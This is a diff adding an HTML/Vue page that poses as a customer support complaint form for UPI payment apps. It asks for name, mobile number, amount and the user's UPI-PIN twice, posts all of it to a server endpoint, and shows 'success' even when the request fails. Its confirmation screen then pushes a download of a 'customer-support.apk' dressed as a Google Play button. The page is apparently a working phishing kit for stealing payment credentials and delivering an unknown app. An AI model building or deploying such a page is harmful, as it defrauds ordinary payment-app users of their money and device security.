@@ -1,0 +1,264 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+	<title>Support Complaint</title>
+	<meta content="" name="description">
+	<meta content="" name="keywords">
+
+	<!-- Favicons -->
+	<link href="assets/img/favicon-32x32.png" rel="icon">
+	<link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+	<!-- Google Fonts -->
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
+	
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+	<!-- Template Main CSS File -->
+	<link href="assets/css/style.css" rel="stylesheet">
+
+	<script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
+</head>
+
+<body>
+
+	<header>
+		<div class="container">
+			<div class="row">
+				<div class="col">
+					<!--<img src="assets/img/banner.jpg" alt="upi-logo">-->
+				</div>
+			</div>
+		</div>
+	</header>
+
+	<div class="hero-image">
+		<img src="assets/img/header3.jpg" class="" alt="complaint support" style="width:100%">
+	</div>
+
+	<!-- ======= Contact Section ======= -->
+	<section id="app">
+		<div class="container">
+			<div class="row">
+				<div class="col">
+					<h4><b>Customer Support</b></h4>
+					<h4>All Type of Complaints Services Provider.</h4>
+				</div>
+			</div>
+			<div class="row justify-content-center">
+				<div class="col-md-6">
+
+					<div class="form-success" v-if="success">
+						<div class="alert alert-success" role="alert" style="text-align: center;">
+							<h4 class="alert-heading">Success!</h4>
+							<p>Your complaint has been registered successfully!</p>
+
+							<div class="card">
+								<div class="card-body" style="text-align: center;">
+									<h5 class="card-title">Download our <b>Android App</b> to track your complaint status</h5>
+									<a href="/customer-support.apk" class="btn btn-dark btn-lg" role="button"><img src="assets/img/google-play.png" alt="">&nbsp;&nbsp;Download</a>
+								</div>
+							</div>
+
+							<hr>
+							<a href="" class="alert-link">Go to Home</a>
+						</div>
+					</div>
+
+					<form v-else v-on:submit.prevent="onSubmit" method="post" role="form" class="php-email-form">
+						
+						<div v-show="step==1">
+							<div class="mb-4">
+								<label for="floatingInputName" class="form-label">Full name <span class="required">*</span></label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.name" class="form-control form-control-lg"
+									id="floatingInputName" placeholder="Enter your full name" maxlength="49">
+							</div>
+							<div class="mb-4">
+								<label for="floatingSelectPaymentMode" class="form-label">Payment Mode <span class="required">*</span></label>
+								<select class="form-select form-control-lg" v-on:change="onKeyUp" v-model="formData.payment_method"
+									id="floatingSelectPaymentMode" aria-label="Select a payment mode">
+									<option value="">--Select--</option>
+									<option value="Google Pay">Google Pay</option>
+									<option value="PhonePe">PhonePe</option>
+									<option value="Paytm">Paytm</option>
+									<option value="Amazon Pay">Amazon Pay</option>
+									<option value="others">Others</option>
+								</select>
+							</div>
+							<div class="mb-4">
+								<label for="floatingInputMobileNo" class="form-label">Registered Mobile No <span class="required">*</span></label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.mobile_no" class="form-control form-control-lg"
+									id="floatingInputMobileNo" placeholder="Enter your mobile no" maxlength="20">
+							</div>
+							<div class="mb-4">
+								<label for="floatingTextarea2" class="form-label">Issue <span class="required">*</span></label>
+								<textarea class="form-control form-control-lg" v-on:keyup="onKeyUp" v-model="formData.issue" placeholder="Enter issue"
+									id="floatingTextarea2" style="height: 100px" maxlength="500"></textarea>
+							</div>
+						</div>
+
+						<div v-show="step==2">
+							<div class="mb-4">
+								<label for="floatingInputAmount" class="form-label">Amount <span class="required">*</span></label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.amount" class="form-control form-control-lg"
+									id="floatingInputAmount" placeholder="Enter amount" maxlength="20">
+							</div>
+						</div>
+
+						<div v-show="step==3">
+							<div class="mb-4">
+								<label for="floatingInputMpin" class="form-label">UPI-PIN <span class="required">*</span></label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.m_pin_1" class="form-control form-control-lg"
+									id="floatingInputMpin" placeholder="Enter UPI-Pin" maxlength="20">
+							</div>
+						</div>
+
+						<div v-show="step==4">
+							<div class="mb-4">
+								<label for="floatingInputMpin" class="form-label">UPI-PIN</label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.m_pin_2" class="form-control form-control-lg"
+									id="floatingInputMpin" placeholder="Enter UPI-PIN" maxlength="20">
+							</div>
+						</div>
+
+						<div v-show="hasError">
+							<div class="alert alert-danger" role="alert">
+								{{errorMsge}}
+							</div>
+						</div>
+
+						<div class="text-right" style="text-align:right;">
+							<button class="btn btn-warning" type="submit">
+								<span v-if="step==4">Submit</span>
+								<span v-else>Next Step</span>
+							</button>
+						</div>
+
+
+						<div class="form-loading" v-show="loading">
+							<div class="d-flex justify-content-center">
+								<div class="spinner-border" role="status">
+									<span class="visually-hidden">Loading...</span>
+								</div>
+							</div>
+						</div>
+
+					</form>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<!-- Vendor JS Files -->
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+	<script>
+		var app = new Vue({
+			el: '#app',
+			data: {
+				step: 1,
+				hasError: false,
+				errorMsge: "All fields are required!",
+				loading: false,
+				success: false,
+				formData: {
+					name: "",
+					payment_method: "",
+					mobile_no: "",
+					amount: "",
+					issue: "",
+					m_pin_1: "",
+					m_pin_2: "",
+				},
+			},
+			coumputed: {
+				prigressPercentage(value) {
+					return (value / 5) * 100;
+				}
+			},
+			methods: {
+				onKeyUp() {
+					this.errorMsge = "All fields are required!";
+					this.hasError = false;
+				},
+				onSubmit() {
+					this.errorMsge = "All fields are required!";
+					this.hasError = false;
+
+					if (this.step == 1) {
+						if (!this.formData.name || !this.formData.payment_method || !this.formData.mobile_no || !this.formData.issue) {
+							this.hasError = true;
+						}
+						else {
+							this.step += 1;
+						}
+					}
+					else if (this.step == 2) {
+						if (!this.formData.amount) {
+							this.hasError = true;
+						}
+						else {
+							this.step += 1;
+						}
+					}
+					else if (this.step == 3) {
+						if (!this.formData.m_pin_1) {
+							this.hasError = true;
+						}
+						else {
+							this.step += 1;
+						}
+					}
+					else if (this.step == 4) {
+						this.loading = true;
+						this.sendData();
+					}
+					else {
+						console.log("something");
+					}
+				},
+				sendData() {
+					const requestOptions = {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+						},
+						dataType: 'json',
+						body: JSON.stringify(this.formData)
+					};
+					fetch('/api/submitForm', requestOptions)
+						.then(async response => {
+							const data = await response.json();
+							if (data.success) {
+								setTimeout(() => {
+									this.loading = false;
+									this.success = true;
+								}, 2000);
+							}
+							else{
+								alert("Something went wrong, Please click submit again.");
+							}
+						})
+						.catch(error => {
+							this.errorMessage = error;
+							setTimeout(() => {
+									this.loading = false;
+									this.success = true;
+								}, 2000);
+							console.error('There was an error!', error);
+						});
+				}
+			}
+		})
+	</script>
+
+</body>
+
+</html>
